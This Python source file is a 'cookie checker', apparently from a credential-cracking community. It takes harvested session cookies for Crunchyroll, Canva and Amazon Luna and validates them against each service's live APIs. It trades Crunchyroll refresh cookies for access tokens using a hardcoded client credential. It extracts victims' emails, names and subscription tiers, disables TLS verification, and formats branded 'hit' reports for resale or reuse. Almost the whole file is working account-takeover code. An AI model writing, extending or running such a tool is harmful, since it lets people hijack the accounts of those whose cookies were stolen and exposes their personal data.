"""
Extra Cookie Checkers — Crunchyroll & Canva
NOTE: Crunchyroll token flow uses public web client; if it fails -> 'error' (not 'expired').
"""
import re
import json
import requests
from datetime import datetime
from typing import Dict, List, Tuple, Optional

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except Exception:
    pass

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")


def _parse_cookies(text: str) -> Dict[str, str]:
    out = {}
    stripped = text.strip()
    # JSON format support (array ya {"cookies": [...]})
    if stripped.startswith('[') or stripped.startswith('{'):
        try:
            data = json.loads(stripped)
            if isinstance(data, dict):
                data = data.get('cookies', [])
            if isinstance(data, list):
                for c in data:
                    if isinstance(c, dict) and c.get('name') is not None:
                        out[str(c['name'])] = str(c.get('value', ''))
                if out:
                    return out
        except Exception:
            pass
    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue
        if line.startswith('#'):
            # "#HttpOnly_..." netscape lines allowed, baaki comment skip
            if not line.startswith('#HttpOnly_'):
                continue
            line = line[len('#HttpOnly_'):]
        # Cookie:/Set-Cookie: header style
        low = line.lower()
        if low.startswith('cookie:') or low.startswith('set-cookie:'):
            line = line.split(':', 1)[1].strip()
        # Netscape — TAB separated
        parts = line.split('\t')
        if len(parts) >= 7:
            out[parts[5]] = parts[6]
            continue
        # Netscape — SPACE separated (kuch extractors tabs nahi likhte)
        sp = line.split()
        if len(sp) >= 7 and sp[1].upper() in ('TRUE', 'FALSE') and sp[3].upper() in ('TRUE', 'FALSE'):
            out[sp[5]] = ' '.join(sp[6:])
            continue
        # key=value pairs
        if '=' in line:
            for seg in line.split(';'):
                if '=' in seg:
                    k, v = seg.split('=', 1)
                    k = k.strip()
                    if k and k.lower() not in ('cookie', 'set-cookie'):
                        out[k] = v.strip()
    return out


# ═══ CRUNCHYROLL ════════════════════════════════════════════════════════════

# Public web client (checker community standard). Agar ye dead ho to yahan naya daalo.
CR_BASIC = "b2VkYXJteHN0bG5lcDZ6dnF3emE6dnlBR2VVdHktMEp1R3NfcE1CSFJlTVRKSUIwLVNheURs"


def is_valid_crunchyroll(d: dict) -> bool:
    return any(k in d for k in ('etp_rt', 'etp-rt', 'refresh_token'))


def count_valid_crunchyroll(files):
    result = []
    for src, text in files:
        d = _parse_cookies(text)
        if is_valid_crunchyroll(d):
            result.append((src, d))
    return len(result), result


def check_crunchyroll_cookie(cookies_dict: dict, proxies_list=None):
    """etp_rt cookie → access token → account info + premium benefits."""
    try:
        rt = cookies_dict.get('etp_rt') or cookies_dict.get('etp-rt') or cookies_dict.get('refresh_token', '')
        if not rt or len(rt) < 10:
            return None, 'invalid'

        session = requests.Session()
        for k, v in cookies_dict.items():
            session.cookies.set(k, v, domain=".crunchyroll.com", path="/")

        headers = {
            'User-Agent': UA,
            'Authorization': f'Basic {CR_BASIC}',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        try:
            tr = session.post('https://www.crunchyroll.com/auth/v1/token',
                              data={'grant_type': 'etp_rt_cookie', 'scope': 'offline_access'},
                              headers=headers, timeout=(10, 20), verify=False)
        except Exception:
            return None, 'error'

        if tr.status_code in (401, 403):
            return None, 'expired'
        if tr.status_code != 200:
            return None, 'error'

        td = tr.json()
        access = td.get('access_token', '')
        if not access:
            return None, 'expired'

        ah = {'User-Agent': UA, 'Authorization': f'Bearer {access}'}
        email = td.get('email') or 'N/A'

        # Premium benefits
        is_premium, plan = False, 'Free'
        try:
            br = session.get('https://api.crunchyroll.com/accounts/v1/me/benefits',
                             headers=ah, timeout=(10, 20), verify=False)
            if br.status_code == 200:
                benefits = br.json()
                items = benefits.get('items', benefits if isinstance(benefits, list) else [])
                if any('premium' in str(b).lower() for b in (items or [])):
                    is_premium, plan = True, 'Premium (Mega Fan)'
        except Exception:
            pass

        return {
            'email': email,
            'username': email,
            'plan': plan,
            'is_premium': is_premium,
            'expires_in': td.get('expires_in', 'N/A'),
        }, 'valid'
    except Exception:
        return None, 'error'


def format_hit_crunchyroll(result, cookies_dict, source):
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    content = f"""════════════════════════════════════════════════════════
  WHITE Crunchyroll Checker  |  Owner: @ADI_WT
════════════════════════════════════════════════════════

  Checked At : {ts}
  Source     : {source}

  Email      : {result.get('email', 'N/A')}
  Plan       : {result.get('plan', 'N/A')}
  Premium    : {'Yes' if result.get('is_premium') else 'No'}

════════════════════════════════════════════════════════
"""
    safe = re.sub(r'[<>:"/\|?*\s]', '_', str(result.get('email', 'unknown'))[:40])
    return content, f"[cr_{safe}].txt"


# ═══ CANVA ══════════════════════════════════════════════════════════════════

def is_valid_canva(d: dict) -> bool:
    return any(k in d for k in ('canva_session', '_canva_session', 'cv_session', 'session_token')) or \
           any('canva' in k.lower() for k in d)


def count_valid_canva(files):
    result = []
    for src, text in files:
        d = _parse_cookies(text)
        if is_valid_canva(d):
            result.append((src, d))
    return len(result), result


def check_canva_cookie(cookies_dict: dict, proxies_list=None):
    """Canva user check — users/me API (best-effort plan detection)."""
    try:
        if not is_valid_canva(cookies_dict):
            return None, 'invalid'

        session = requests.Session()
        for k, v in cookies_dict.items():
            session.cookies.set(k, v, domain=".canva.com", path="/")
            session.cookies.set(k, v, domain="canva.com", path="/")

        headers = {'User-Agent': UA, 'Accept': 'application/json'}
        try:
            r = session.get('https://www.canva.com/_cg/api/users/me', headers=headers,
                            timeout=(10, 20), verify=False)
        except Exception:
            return None, 'error'

        if r.status_code in (401, 403):
            return None, 'expired'
        if r.status_code != 200:
            return None, 'error'

        try:
            d = r.json()
        except Exception:
            return None, 'expired'

        if not isinstance(d, dict) or not (d.get('email') or d.get('id') or d.get('userId')):
            return None, 'expired'

        # Best-effort plan detect — Canva response structure kabhi kabhi badalta hai
        raw = json.dumps(d).lower()
        is_premium = any(k in raw for k in ('"canva_pro"', '"pro"', '"premium"', 'canva pro'))
        if '"free"' in raw and not is_premium:
            plan = 'Free'
        else:
            plan = 'Pro' if is_premium else 'Free'

        return {
            'email': d.get('email', 'N/A'),
            'username': d.get('displayName') or d.get('name') or d.get('email', 'N/A'),
            'plan': plan,
            'is_premium': is_premium,
        }, 'valid'
    except Exception:
        return None, 'error'


def format_hit_canva(result, cookies_dict, source):
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    content = f"""════════════════════════════════════════════════════════
  WHITE Canva Checker  |  Owner: @ADI_WT
════════════════════════════════════════════════════════

  Checked At : {ts}
  Source     : {source}

  Email      : {result.get('email', 'N/A')}
  Name       : {result.get('username', 'N/A')}
  Plan       : {result.get('plan', 'N/A')}
  Premium    : {'Yes' if result.get('is_premium') else 'No'}

════════════════════════════════════════════════════════
"""
    safe = re.sub(r'[<>:"/\|?*\s]', '_', str(result.get('email', 'unknown'))[:40])
    return content, f"[canva_{safe}].txt"


# ═══ AMAZON LUNA ════════════════════════════════════════════════════════════

def is_valid_luna(d: dict) -> bool:
    """Amazon session cookies — koi bhi ek marker kaafi (all regions)"""
    markers = ('session-id', 'session-token', 'x-main', 'ubid-main', 'at-main',
               'session-id-time', 'lc-main', 'sess-at-main')
    if any(k in d for k in markers):
        return True
    for k in d:
        kl = k.lower()
        if kl.startswith(('ubid', 'at-', 'x-acb', 'sess-')) or 'luna' in kl:
            return True
    return False


def count_valid_luna(files):
    result = []
    for src, text in files:
        d = _parse_cookies(text)
        if is_valid_luna(d):
            result.append((src, d))
    return len(result), result


# ── Luna REAL API (captured from luna.amazon.co.uk devtools) ──
LUNA_MARKETPLACES = {
    "com":    ("luna.amazon.com",    "ATVPDKIKX0DER", "en_US", "proxy-prod.tempo.digital.a2z.com"),
    "co.uk":  ("luna.amazon.co.uk",  "A1F83G8C2ARO7P", "en_GB", "proxy-prod.eu-west-1.tempo.digital.a2z.com"),
    "de":     ("luna.amazon.de",     "A1PA6795UKMFR9", "de_DE", "proxy-prod.eu-west-1.tempo.digital.a2z.com"),
}


def _luna_region(cookies_dict: dict) -> str:
    joined = " ".join(cookies_dict.keys()).lower()
    if "acbuk" in joined:
        return "co.uk"
    if "acbde" in joined or "-de" in joined:
        return "de"
    return "com"


def _luna_get_token(session, web_host: str):
    """Step 1: amazon cookies -> luna access token (GET /token)"""
    try:
        r = session.get(f"https://{web_host}/token",
                        headers={"Accept": "*/*", "Content-Type": "application/json"},
                        timeout=(10, 20), verify=False)
        if r.status_code in (401, 403):
            return None, 'expired'
        if r.status_code != 200:
            return None, 'error'
        try:
            d = r.json()
        except Exception:
            return None, 'expired'
        token = (d.get("accessToken") or d.get("access_token") or d.get("token")
                 or d.get("AccessToken") or "")
        if not token and isinstance(d, dict):
            for v in d.values():
                if isinstance(v, str) and len(v) > 50:
                    token = v
                    break
        if not token:
            return None, 'expired'
        return token, 'ok'
    except Exception:
        return None, 'error'


def _luna_api_headers(token, cookies_dict, marketplace_id, locale):
    session_id = cookies_dict.get("session-id", "")
    return {
        "Accept": "*/*",
        "Content-Type": "text/plain;charset=UTF-8",
        "Origin": f"https://{_luna_region_host(cookies_dict)}",
        "Referer": f"https://{_luna_region_host(cookies_dict)}/",
        "X-Amz-Access-Token": token,
        "X-Amz-Device-Serial-Number": session_id,
        "X-Amz-Device-Type": "browser",
        "X-Amz-Marketplace-Id": marketplace_id,
        "X-Amz-Platform": "web",
        "X-Amz-Locale": locale,
        "X-Amz-React-Version": "1.0.35728.0",
        "X-Amz-Session-Id": session_id,
        "X-Amz-Timezone": "Asia/Calcutta",
    }


def _luna_region_host(cookies_dict) -> str:
    return LUNA_MARKETPLACES[_luna_region(cookies_dict)][0]


def _luna_parse_subscription(obj):
    """Response JSON mein subscription markers dhundo — paid/free/None"""
    raw = json.dumps(obj).lower().replace(" ", "")
    paid_markers = ('"issubscribed":true', '"subscribed":true', '"subscriptionstatus":"active"',
                    '"lunaPlus":true', '"luna_plus":true', '"isplus":true', '"membershipstatus":"active"',
                    '"entitlements":["luna', '"hasaccess":true')
    free_markers = ('"issubscribed":false', '"subscribed":false', '"subscriptionstatus":"none"',
                    '"lunaPlus":false', '"membershipstatus":"none', '"hasaccess":false')
    for m in paid_markers:
        if m in raw:
            return True
    for m in free_markers:
        if m in raw:
            return False
    return None


def check_luna_cookie(cookies_dict: dict, proxies_list=None):
    """Amazon Luna check — login + Luna+ subscription (best-effort, primevideo-style)."""
    try:
        if not is_valid_luna(cookies_dict):
            return None, 'invalid'

        session = requests.Session()
        session.cookies.update(cookies_dict)
        session.headers.update({"User-Agent": UA})
        headers = {
            "User-Agent": UA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        }

        # ══ REAL API FLOW (devtools captured) — token → getAppConfig → getPage ══
        api_premium, api_plan, api_profile = None, None, None
        try:
            region = _luna_region(cookies_dict)
            web_host, mp_id, locale, proxy_host = LUNA_MARKETPLACES[region]

            token, tok_status = _luna_get_token(session, web_host)
            if tok_status == 'expired':
                return None, 'expired'

            if token:
                ah = _luna_api_headers(token, cookies_dict, mp_id, locale)
                # Exact payloads — devtools Payload tab se captured
                getpage_payload = json.dumps({
                    "timeout": 10000,
                    "featureScheme": "WEB_V1",
                    "pageContext": {"pageId": "default", "pageUri": "home"},
                    "cacheKey": None,
                    "clientContext": {},
                    "browserMetadata": {
                        "browserClientRole": "browser",
                        "browserType": "Chrome",
                        "browserVersion": "137.0.0.0",
                        "deviceType": "mobile",
                        "osName": "Android",
                        "osVersion": "12.0.0",
                    },
                    "dynamicFeatures": [],
                    "inputContext": {"gamepadTypes": []},
                })

                sub_state = None
                for endpoint, payload in (("getAppConfig", '{"stageOverride": "Prod"}'),
                                          ("getPage", getpage_payload)):
                    try:
                        ar = session.post(f"https://{proxy_host}/{endpoint}",
                                          data=payload, headers=ah,
                                          timeout=(10, 20), verify=False)
                        if ar.status_code in (401, 403) and endpoint == "getAppConfig":
                            return None, 'expired'
                        if ar.status_code == 200:
                            try:
                                data = ar.json()
                            except Exception:
                                continue
                            found = _luna_parse_subscription(data)
                            if found is not None:
                                sub_state = found
                            raw_txt = json.dumps(data)
                            if api_profile is None:
                                nm = re.search(r'"customerName"\s*:\s*"([^"]+)"', raw_txt) or \
                                     re.search(r'"displayName"\s*:\s*"([^"]+)"', raw_txt) or \
                                     re.search(r'"userName"\s*:\s*"([^"]+)"', raw_txt)
                                if nm:
                                    api_profile = nm.group(1)
                    except Exception:
                        continue

                if sub_state is not None:
                    api_premium = sub_state
                    api_plan = "Luna+" if sub_state else "Free"
        except Exception:
            pass

        try:
            r = session.get("https://luna.amazon.com/", headers=headers,
                            timeout=(10, 20), verify=False, allow_redirects=True)
        except Exception:
            return None, 'error'

        if "signin" in r.url.lower() or "ap/signin" in r.url.lower():
            return None, 'expired'
        if r.status_code in (401, 403):
            return None, 'expired'
        if r.status_code != 200:
            return None, 'error'

        low = (r.text or "").lower()
        if "ap/signin" in low:
            return None, 'expired'

        profile = api_profile or "N/A"
        if profile == "N/A":
            m = re.search(r'"customerName"\s*:\s*"([^"]+)"', r.text)
            if m:
                profile = m.group(1)

        # Luna+ subscription detection — multi-marker scoring
        paid_score, free_score = 0, 0
        if '"issubscribed":true' in low or '"subscribed":true' in low:
            paid_score += 3
        if "luna+" in low and ("manage" in low or "subscribed" in low):
            paid_score += 2
        if '"subscriptionstatus":"active"' in low or '"subscription_status":"active"' in low:
            paid_score += 3
        if "try luna+" in low or "start your free trial" in low or "join luna+" in low:
            free_score += 2
        if "subscribe now" in low:
            free_score += 1

        # Prefer API result, otherwise page-marker score
        if api_plan is not None:
            is_premium, plan = api_premium, api_plan
        elif paid_score > free_score:
            is_premium, plan = True, "Luna+"
        elif free_score > paid_score:
            is_premium, plan = False, "Free"
        else:
            is_premium, plan = None, "Unknown"

        region = "N/A"
        rm = re.search(r'"marketplace"\s*:\s*"([^"]+)"', r.text) or re.search(r'"recordTerritory"\s*:\s*"([^"]+)"', r.text)
        if rm:
            region = rm.group(1)

        return {
            "profile": profile,
            "email": "N/A",
            "plan": plan,
            "is_premium": bool(is_premium),
            "region": region,
        }, 'valid'
    except Exception:
        return None, 'error'


def format_hit_luna(result, cookies_dict, source):
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    content = f"""════════════════════════════════════════════════════════
  WHITE Amazon Luna Checker  |  Owner: @ADI_WT
════════════════════════════════════════════════════════

  Checked At : {ts}
  Source     : {source}

  Profile    : {result.get('profile', 'N/A')}
  Plan       : {result.get('plan', 'N/A')}
  Premium    : {'Yes' if result.get('is_premium') else 'No'}
  Region     : {result.get('region', 'N/A')}

════════════════════════════════════════════════════════
"""
    safe = re.sub(r'[<>:"/\\|?*\\s]', '_', str(result.get('profile', 'unknown'))[:40])
    return content, f"[luna_{safe}].txt"
